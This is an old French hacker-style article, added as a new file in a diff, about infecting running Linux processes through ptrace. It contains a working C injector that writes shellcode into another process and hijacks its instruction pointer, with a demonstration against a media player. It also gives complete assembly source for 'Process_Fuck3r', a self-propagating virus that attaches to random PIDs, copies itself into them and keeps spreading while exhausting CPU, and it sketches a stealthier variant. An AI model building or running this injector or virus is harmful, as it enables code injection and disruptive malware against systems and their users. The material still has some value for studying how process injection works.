@@ -1,0 +1,541 @@
+                                                      _        __          _   _             
+                                                     (_)      / _|        | | (_)            
+               _ __  _ __ ___   ___ ___  ___ ___      _ _ __ | |_ ___  ___| |_ _  ___  _ __  
+              | '_ \| '__/ _ \ / __/ _ \/ __/ __|    | | '_ \|  _/ _ \/ __| __| |/ _ \| '_ \ 
+              | |_) | | | (_) | (_|  __/\__ \__ \    | | | | | ||  __/ (__| |_| | (_) | | | |
+              | .__/|_|  \___/ \___\___||___/___/    |_|_| |_|_| \___|\___|\__|_|\___/|_| |_|
+              | |                                                                         
+              |_|                         
+
+
+
+    -- [ Infection des process en runtime
+
+                                     
+N.B. : Cet article etait destine a etre publie ailleurs il y a longtemps. 
+Depuis d'autre article sur le sujet on vu le jour, dont un dans MISC.
+
+
+    1 - Introduction.
+
+    2 - Jouer avec ptrace.
+
+    3 - Virus: première approche.
+
+    4 - Evolution ?
+
+
+
+
+1 - Introduction
+----------------
+
+ Je considère cet article comme un article 'détente', ce n'est pas trés 
+technique les code sont simples et je trouve la finalité inutile mais 
+marrante (:
+
+Plus sérieusement la modification de process en run-time n'a rien de nouveaux
+il existe deja quelque chose la dessus dans phrack.
+La plus part de ces articles on une approche permettant l'installation
+d'une backdoor sur la machine.
+Cet article traite de la facon de propager un virus de process en process.
+
+
+2 - Jouer avec ptrace
+---------------------
+
+  Tout ce qui concerne le debugging, sous linux, est lié a ptrace(), on peut
+tracer un process que l'on va exécuter avec PTRACE_TRACEME, ou alors tracer
+un process en cours d'excution avec PTRACE_ATTACH.
+
+Autre option de ptrace() néssécaire:
+ -PTRACE_GETREGS rempli une structure (user_regs_struct) contenant l'état des
+  registres du process tracé.
+ -PTRACE_SETREGS quand a lui sert a modifier l'état des registres.
+ -PTRACE_POKEDATA nous premet d'ecrire dans l'espace du process tracé.
+ -PTRACE_DETTACH libère le process tracé.
+
+
+
+Commencons par simplement injecter du code dans un process et lui faire
+executer.
+
+Déroulement de l'opération:
+
+
+                           Attachement au process.
+                                      |
+                                      |
+                           Attente et vérification
+                             de l'atachement.
+                                      |
+                                      |
+                            Régupération de l'état
+                           des registres du process
+                                    tracé.
+                                      |
+                                      |
+                            Allocation d'espace dans
+                                 le process.
+                                      |
+                                      |
+                            Copie du code a injecter
+                                dans cet espace.
+                                      |
+                                      |
+                             Redirigé le process vers
+                                    ce code
+                                      |
+                                      |
+                               Détacher le proces
+
+
+
+
+Vla un petit bout de code pour illustrer ca :
+
+
+--[test.c]
+
+#include <stdio.h>
+#include <sys/ptrace.h>
+#include <errno.h>
+#include <asm/user.h>
+#include <sys/wait.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+
+int main (int argc, char **argv)
+{
+	char shellcode []=
+	"\x90\x90\x90\x90\x90"	//times 5 nop
+	"\x31\xc0"		//xor    %eax,%eax
+	"\x99"			//cltd
+	"\xb0\x04"		//mov    $0x4,%al
+	"\x31\xdb"		//xor    %ebx,%ebx
+	"\x43"			//inc    %ebx
+	"\x68\x64\x20\x21\x0a"	//push   $0xa212064
+	"\x68\x6f\x77\x6e\x33"	//push   $0x656e776f
+	"\x89\xe1"		//mov    %esp,%ecx
+	"\xb2\x08"		//mov    $0x4,%dl
+	"\xcd\x80"		//int    $0x80
+	"\x31\xc0"		//xor    %eax,%eax
+	"\x40"			//inc    %eax
+	"\x31\xdb"		//xor    %ebx,%ebx
+	"\xcd\x80";		//int    $0x80
+
+
+	pid_t	pid;
+	struct user_regs_struct reg;
+	int i;
+
+	if(!argv[1]){
+		printf("%s <pid_to_own>\n\n",argv[0]);
+		exit(1);
+	}
+
+	pid = atoi(argv[1]);
+	if(ptrace(PTRACE_ATTACH, pid, NULL,NULL)){
+		perror("PTRACE_ATTACH");
+		exit(1);
+	}
+	printf("[+] Attente d'atachement au processus %d\n",pid);
+
+	if(waitpid(pid,NULL,WUNTRACED)<0){
+		perror("waitpid WUNTRACED");
+		exit(1);
+	}
+	printf("[+] Attachement réussi\n");
+
+	if(ptrace(PTRACE_GETREGS, pid, NULL, &reg)){
+		perror("PTRACE_GETREGS");
+		exit(1);
+	}
+	printf("[+] Lecture des registres:\n");
+	printf("\t-eip: %#08lx\n\t-esp: %#08lx\n",reg.eip,reg.esp);
+
+	reg.esp-=4096;
+
+	for(i=0;i<36;i+=4){
+		if(ptrace(PTRACE_POKEDATA, pid, reg.esp+i,*(int*)&shellcode[0+i])){
+			perror("PTRACE_POKEDATA");
+			exit(1);
+		}
+	}
+	printf("[+] Shellcode copié en esp:%#08lx\n",reg.esp);
+
+	reg.eip=reg.esp;
+	reg.eip+=3;	                  //eip commence souvent 2 bytes avant
+
+	if(ptrace(PTRACE_SETREGS, pid, NULL, &reg)){
+		perror("PTRACE_SETREGS");
+		exit(0);
+	}
+
+	printf("[+] Redirection vers le shellcode eip:%#08lx\n",reg.eip);
+	printf("[+] Détachement du processus %d\n",pid);
+	ptrace(PTRACE_DETACH, pid, NULL, NULL);
+	return(0);
+}
+
+
+--[/test.c]
+
+
+
+
+Ce bout de code permet d'injecter un shellcode dans un proces definit par
+argv[1].
+Le shellcode affiche juste own3d ! et fait un exit(0);
+
+Démonstration :
+$ gcc test.c
+$ ps ax | grep mplayer
+  306 pts/2    S      0:00 mplayer Aural Planet - Changing My Mind.mp3
+
+$ ./a.out 306
+[+] Attente d'atachement au processus 306
+[+] Attachement réussi
+[+] Lecture des registres:
+	-eip: 0x40214de1
+	-esp: 0xbfffe920
+[+] Shellcode copié en esp:0xbfffd920
+[+] Redirection vers le shellcode eip:0xbfffd923
+[+] Détachement du processus 306
+own3d !
+$
+
+
+Pour une raison que je comprend pas, si je copie le shellcode a une adress
+et que je redirige eip a cet adresse eip commence toujours 2 bytes avant.
+Pour etre sur j'ai mis 5 nop au debut du shellcode, puis je redirige eip a
+l'adresse du shellcode +3.
+
+Le code étant inséré dans la stack il est évident que ca ne fonctionnera pas
+sur les kernel avec une stack protect.
+
+
+
+
+
+3 - Virus: première approche
+----------------------------
+
+  Maintenant un peu plus amusant.
+Le but est de faire en sorte que le code injecter a un process soit capable de
+rechercher lui meme des process a infecter, de les infecter et que ces process
+infecté soit a leur tour capable d'infecter d'autre process.
+
+Une fois le virus lancé, les process infecté vont stopper leur activité et
+passer leur temps à chercher d'autre process a infecter;)
+Préparez vous donc à rebootez dans la minute qui suit, ou a jouer
+rapidement du kill ;)
+
+Pour que ce soit plus drole le virus contient un générateur de nombre
+pseudo alétoire pour le choix des pids a infecter.
+
+Fonctionnement du virus:
+
+
+                       ______________________
+                      |                      |
+              +------>| tirage PID aléatoire |
+              |       |______________________|
+              |                   |
+              |                   |
+              |         __________|___________
+              |        /                     /
+              +--NON--+ Attachement au PID  /
+              |      /_____________________/
+              |                   |
+              |                  oui
+              |        ___________|_________
+              |       |                     |
+              |       |      Infection      |
+              |       |_____________________|
+              |                   |
+              |        ___________|_________
+              |       |                     |
+              +-------+      Détachement    |
+                      |_____________________|
+
+
+
+
+La parti infection reprend a peu pret la meme que celle décrite dans le
+chapitre2 avec en plus un test pour savoir si le process est deja
+infecté ou pas.
+Un process est déclaré comme deja infecté si eip==0xBxxxxxxx.
+(Note, le 0xBxxxxxxx n'est pas valide pour les Fedora qui de toute facon
+on une stack non exec par defaut.)
+
+
+
+
+
+
+
+;                                  Process_Fuck3r
+;                                  --------------
+;
+;
+;nasm -f elf pf.asm
+;cc pf.o -o pf -nostdlib
+;
+;
+
+STRUC regs_struc
+	.ebx:		resd		1
+	.ecx:		resd		1
+	.edx:		resd		1
+	.esi:		resd		1
+	.edi:		resd		1
+	.ebp:		resd		1
+	.eax:		resd		1
+	.ds:		resw		1
+	.__ds:		resw		1
+	.es:		resw		1
+	.__es:		resw		1
+	.fs:		resw		1
+	.__fs:		resw		1
+	.gs:		resw		1
+	.__gs:		resw		1
+	.orig_eax:	resd		1
+	.eip:		resd		1
+	.cs:		resw		1
+	.__cs:		resw		1
+	.eflags		resd		1
+	.esp:		resd		1
+	.ss:		resw		1
+	.__ss:		resw		1
+ENDSTRUC
+
+%define size_regs_struc (regs_struc.__ss)-(regs_struc.ebx) +2
+
+
+%define		sys_fork		2
+
+%define		sys_time		13
+
+%define		sys_ptrace		26
+%define		PTRACE_POKEDATA		 5
+%define		PTRACE_GETREGS		12
+%define		PTRACE_SETREGS		13
+%define		PTRACE_ATTACH		16
+%define		PTRACE_DETACH		17
+
+%define		sys_times		43
+
+
+
+global _start
+section .evil
+
+_start:
+
+	times	4	nop
+
+call	delta
+delta:
+	pop 	ebp
+	sub	ebp, 9
+
+
+
+;-----------------------------------------------------------------------------
+;
+;générateur de nombres pseudo aléatoire
+
+_rnd_pid:
+
+	xor	eax, eax
+	mov	 al, sys_time
+	xor 	ebx, ebx
+	int 	0x80
+
+	push	0x0000FFFF
+
+	shl	eax, cl
+        add     eax, ecx                ; Adjust random value with random seed
+        rol     ecx, 1                  ; Adjust random seed.
+        add     ecx, 0x666
+        push    32
+        pop     ecx
+
+CRC_Bit:
+        shr     eax, 1                  ; Bit is set?
+        jnc     Loop_CRC_Bit
+        xor     eax, 0xedb88320
+
+Loop_CRC_Bit:
+        loop    CRC_Bit                 ; Do all 32 bits.
+        pop     ecx                     ; ECX = Max_Val.
+
+        xor     edx, edx                ; Divide truely random value
+        div     ecx                     ; by Max_Val.
+        xchg    edx, ecx
+
+
+
+;-----------------------------------------------------------------------------
+;
+;ptrace attach
+
+	xor 	eax, eax
+	mov	 al, sys_ptrace
+	xor	ebx, ebx
+	mov	 bl, PTRACE_ATTACH  ;
+	xor 	edx, edx
+	xor 	esi, esi
+	int 	0x80
+
+	test	eax, eax
+	jne	_rnd_pid            ;si eax négatif on essay un aure process
+
+
+
+;-----------------------------------------------------------------------------
+;
+;recup des registres
+	xor 	eax, eax
+	mov	 al, sys_ptrace
+	xor	ebx, ebx
+	mov 	ebx, PTRACE_GETREGS
+	xor	edx, edx
+	sub	esp, size_regs_struc
+	mov	esi, esp
+	int	0x80
+
+	test	eax, eax
+	jne	_detach
+
+
+;-----------------------------------------------------------------------------
+;
+;test infection
+debug:
+	mov	eax, [esp+regs_struc.eip]
+	shr	eax, 28
+	cmp	eax, 0xb             ;si quartet fort de eip == 0xb on quitte
+	je	_detach
+
+
+
+;recup de la place sur la stack du process hote
+_stack:
+	mov	eax,[esp+regs_struc.esp]
+	sub	eax, 4096
+	mov	[esp+regs_struc.esp], eax
+
+
+;prépare la copi
+	mov	eax, _end-_start     ;taille a copier
+	xor	edi, edi             ;initialisation compteur
+
+_copie:
+        mov     ebx, PTRACE_POKEDATA
+        lea     edx, [esp+regs_struc.esp+edi]
+        mov     esi, dword [ebp+edi]
+	push	eax				;sauvegarde de la size a copier
+	xor	eax, eax
+	mov	 al, sys_ptrace
+	int 	0x80
+	test	eax, eax
+	jne	_detach
+	pop	eax
+	add	edi, 4
+	cmp	edi, eax
+	jbe	_copie
+
+
+
+;redirection eip
+_redirection:
+	lea	eax, [esp+regs_struc.esp]
+	add	eax, 2
+	mov	[esp+regs_struc.eip], eax
+	xor	eax, eax
+	mov	 al, sys_ptrace
+	mov	ebx, PTRACE_SETREGS
+	xor 	edx, edx
+	mov	esi, esp
+	int	0x80
+
+_detach:
+	add	esp, size_regs_struc	;restauration de la stack
+
+	xor 	eax, eax
+	mov	 al, sys_ptrace
+	xor	ebx, ebx
+	mov	ebx, PTRACE_DETACH
+	xor	edx, edx
+	xor	esi, esi
+	int 	0x80
+
+	jmp 	_rnd_pid
+
+times	3	nop
+_end:
+
+
+
+
+
+$ nasm -f elf pf.asm
+$ cc pf.o -o pf -nostdlib
+$ readelf -e pf |grep evil
+  [ 2] .evil           PROGBITS      08048080 000080 0000ee 00   A  0   0  1
+
+Le virus est simple et tout petit seulement 238octets non optimisé.
+
+
+Bon évidament pour un max de fun, le mieux pour le tester c'est d'etre sous 
+une mandrake bien lourde avec KDE comme window manager et tout plein
+de truc lancé ;)
+Et pour ceux d'entre vous, qui aime les choses extrème et qui veulent un max
+de sensation, j'vous conseille de le lancer en r00t.
+
+Une fois lancé, le virus va utiliser toute la puissance du CPU pour
+rechercher un process a infecter, une fois qu'il va en trouver un et
+l'infecter il vont ce partager a 2 les ressorces CPU restante et ainsi de
+suite. La technique bien bourrin quoi :)
+On peut donc suivre les process infecté avec top c'est facile c'est
+ceux qui bouffent toutes les ressources ;)
+
+
+
+
+4 - Evolution ?
+---------------
+
+  Oui faudrais pouvoir faire évoluer ce virus, car si c'est fun de lancer
+aprés l'avoir codé, la 2eme fois c'est vraiment relou de foutre en l'air
+ca session.
+
+Le problème principal de Process_fucker est que le process hote est arrétté.
+
+On peut empéché ca en forkant le virus, oui mais alors la aucun interet de
+s'ataché préalablement a un process :)
+
+
+Autre solution:
+
+Une fois le PTRACE_ATTACH réussi on decend suffisament loin dans la pile,
+on vérifie que l'espace est plein de zéros (pour minimiser les risques
+de destructions de données du process), et on ecrit le virus.
+Lorsque le virus a reussi a infecté un autre process il rend la main au
+process hote.
+De cette facon les process sont juste mis en pause le temps d'en infecter
+un autre et une seule copi du virus tourne en meme temps.
+
+Le virus fonctionne a peu pret de la meme facon sauf qu'il devra commencer par
+sauver l'état des registres du process hote.
+Ensuite il cherche un process a infecter et une fois le PTRACE_DETACH effectué
+au lieu de repartir cherche un autre process il devra restauré les registres
+préalablement sauvé et jumpé ou pointé eip avant son execution.
+
+
+
+    -- [ Pere-Castor
+
